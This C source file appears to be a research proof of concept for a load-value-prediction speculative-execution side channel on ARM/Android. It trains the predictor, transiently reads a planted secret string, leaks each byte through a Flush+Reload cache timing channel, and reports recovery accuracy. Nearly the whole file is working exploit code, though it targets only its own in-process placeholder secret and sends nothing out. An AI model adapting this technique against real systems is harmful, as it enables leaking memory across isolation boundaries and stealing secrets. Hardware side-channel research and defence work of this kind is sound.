#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include "pmu_android.h"
#include <time.h>

#define PAGE_SZ 16384
#define CACHE_LINE_SZ 64
#define NUM_CACHELINES PAGE_SZ / CACHE_LINE_SZ
#define CACHE_HIT_THRESHOLD 100
#define REPS 300

#define READ(addr) (*(volatile uint32_t *)(addr))
#define FORCE_READ(addr, trash) (READ((uintptr_t)(addr) | (trash == 0xbaaaaad)))

// We attempt to read this string using the LVP.
const char *secret = "Mr and Mrs Dursley, of number four, Privet Drive, were proud to say that they were perfectly normal, thank you very much. They were the last people youd expect to be involved in anything strange or mysterious, because they just didnt hold with such nonsense.";

// Note: must serialize with isb and dsb ish
inline __attribute__((always_inline)) void clflush(void *ptr)
{
    serialized_flush(ptr);
}

// For shuffling cacheline indices in an array as to randomize
// the memory access pattern.
void shuffle(volatile int *array, volatile int n)
{
    if (n > 1)
    {
        for (int i = 0; i < n - 1; i++)
        {
            volatile int j = i + rand() / (RAND_MAX / (n - i) + 1);
            volatile int temp = array[j];
            array[j] = array[i];
            array[i] = temp;
        }
    }
}

// Function to count matching bits between two chars
int countMatchingBits(char a, char b)
{
    int matchingBits = 0;
    char xorResult = a ^ b; // XOR the two chars

    // Count the number of zero bits in the XOR result
    for (int i = 0; i < 8; i++)
    {
        if (!(xorResult & (1 << i)))
        {
            matchingBits++;
        }
    }

    return matchingBits;
}

__attribute__((noinline)) void critical_section(void *page, volatile int *indices, volatile unsigned char *channel_ptr, unsigned char *dummy_ptr, unsigned char *secret_ptr, int iters)
{
    // During training, both pointers are dummies and the load
    // value is 0x0. Hence, only the dummy is touched. On the single attack run,
    // we give dummy and secret, but the load value is changed to 0x1. Hence,
    // architecturally, only the dummy should hit. However, with the LVP, the
    // 0x0 load value executes transiently, accessing the secret.
    unsigned char *aop[2];
    aop[0] = secret_ptr;
    aop[1] = dummy_ptr;

    register uint64_t trash = 0;
    for (int i = 0; i < iters; i++)
    {
        volatile int idx = indices[i % NUM_CACHELINES];
        trash = FORCE_READ((volatile char *)page + idx * CACHE_LINE_SZ, trash);

        // Use load value as index into AoP, deref the selected ptr,
        // and then transmit the result over cache channel.
        register unsigned char *ptr = aop[(uint8_t)trash];
        volatile unsigned char junk = channel_ptr[*ptr * PAGE_SZ];
    }
}

int main(int argc, char *argv[])
{
    if (argc != 2)
    {
        printf("Usage: %s CORE\n", argv[0]);
        return EXIT_FAILURE;
    }

    // Initialize RNG for random page access.
    srand(time(NULL));
    const int core_id = atoi(argv[1]);
    pin_to_core_android(core_id);
    try_enable_pmu_for_this_process();

    // Allocate one test page and memset it
    // such that load values become constant.
    void *page = mmap(NULL, PAGE_SZ, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page == MAP_FAILED)
    {
        printf("Failed to allocate page\n");
        return EXIT_FAILURE;
    }
    else
    {
        memset(page, 0x0, PAGE_SZ);
    }

    // Make array to hold the cacheline indices, then
    // shuffle the order of accesses.
    volatile int indices[NUM_CACHELINES];
    for (int i = 0; i < NUM_CACHELINES; i++)
    {
        indices[i] = i;
    }
    shuffle(indices, NUM_CACHELINES);

    // Allocate dummy page.
    void *dummy_page = mmap(NULL, PAGE_SZ, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    unsigned char *dummy_ptr;

    if (dummy_page == MAP_FAILED)
    {
        printf("Failed to allocate dummy pages\n");
        return EXIT_FAILURE;
    }
    else
    {
        memset(dummy_page, 0xff, PAGE_SZ);
        dummy_ptr = (unsigned char *)dummy_page;
    }

    // Allocate secret page.
    void *secret_page = mmap(NULL, PAGE_SZ, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    unsigned char *secret_ptr;

    if (secret_page == MAP_FAILED)
    {
        printf("Failed to allocate secret pages\n");
        return EXIT_FAILURE;
    }
    else
    {
        strcpy((char *)secret_page, secret);
        secret_ptr = (unsigned char *)secret_page;
    }

    // Allocate the cache channel.
    void *channel_pages = mmap(NULL, 256 * PAGE_SZ, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    unsigned char *channel_ptr;

    if (channel_pages == MAP_FAILED)
    {
        printf("Failed to allocate cache channel pages\n");
        return EXIT_FAILURE;
    }
    else
    {
        memset(channel_pages, 0x99, 256 * PAGE_SZ);
        channel_ptr = (unsigned char *)channel_pages;
    }

    struct timespec start, end;
    double elapsed_time;
    char result[strlen(secret) + 1];
    result[strlen(secret)] = '\0';

    clock_gettime(CLOCK_MONOTONIC, &start);
    for (int pos = 0; pos < strlen(secret); pos++)
    {
        // Need to reset page to 0x0
        memset(page, 0x0, PAGE_SZ);

        // Train the LVP. Here, the AoP only contains dummy pointers,
        // so the secret is never architecturally touched.
        critical_section(page, indices, channel_ptr, dummy_ptr, dummy_ptr, REPS);

        // Flush the cache channel array.
        for (int set = 0; set < 256; ++set)
        {
            clflush((void *)(channel_ptr + set * PAGE_SZ));
        }

        // Change the ground truth load value to be 1 instead of 0. This makes the arch
        // load value for the gadget 0x1, but LVP will predict 0x0.
        memset(page, 0x1, PAGE_SZ);

        // Flush the page's cachelines.
        for (int i = 0; i < NUM_CACHELINES; i++)
        {
            clflush((void *)((volatile char *)page + i * CACHE_LINE_SZ));
        }

        // Serialize the flush operations.
        asm volatile("isb");
        asm volatile("dsb ish");

        // Load the same PC again, activating the LVP. Here, aop[0] will
        // have secret, and aop[1] will have dummy.
        critical_section(page, indices, channel_ptr, dummy_ptr, secret_ptr + pos, 1);

        // Measure the cache channel.
        uint64_t timings[256];
        for (int i = 0; i < 256; ++i)
        {
            uint64_t start = rdtsc();
            volatile unsigned char trash = channel_ptr[i * PAGE_SZ];
            uint64_t end = rdtsc();
            timings[i] = end - start;
        }

        // Prevent early null-termination due to F+R noise.
        result[pos] = 0x20;

        // Record byte value that hits in the cache
        // EXCEPT for 0xff (which is the dummy value).
        for (int j = 32; j < 128; ++j)
        {
            if (timings[j] < CACHE_HIT_THRESHOLD)
            {
                result[pos] = (char)j;
                break;
            }
        }
    }
    clock_gettime(CLOCK_MONOTONIC, &end);

    int matchingBits = 0;
    for (int pos = 0; pos < strlen(secret); pos++)
    {
        matchingBits += countMatchingBits(result[pos], secret[pos]);
    }

    printf("Secret: %s\n", secret);
    printf("Output: %s\n", result);
    printf("%d bits out of %lu total bits match\n", matchingBits, strlen(secret) * 8);
    printf("Accuracy: %.2f\n", (double)matchingBits / (strlen(secret) * 8));

    elapsed_time = (end.tv_sec - start.tv_sec) +
                   (end.tv_nsec - start.tv_nsec) / 1E9;

    printf("Elapsed time: %.9f seconds\n", elapsed_time);

    // Clean up allocations.
    if (munmap(page, PAGE_SZ) == -1)
    {
        printf("Failed to deallocate page\n");
        return EXIT_FAILURE;
    }
    if (munmap(dummy_page, PAGE_SZ) == -1)
    {
        printf("Failed to deallocate dummy page\n");
        return EXIT_FAILURE;
    }
    if (munmap(secret_page, PAGE_SZ) == -1)
    {
        printf("Failed to deallocate secret page\n");
        return EXIT_FAILURE;
    }
    if (munmap(channel_pages, 256 * PAGE_SZ) == -1)
    {
        printf("Failed to deallocate cache channel pages\n");
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}
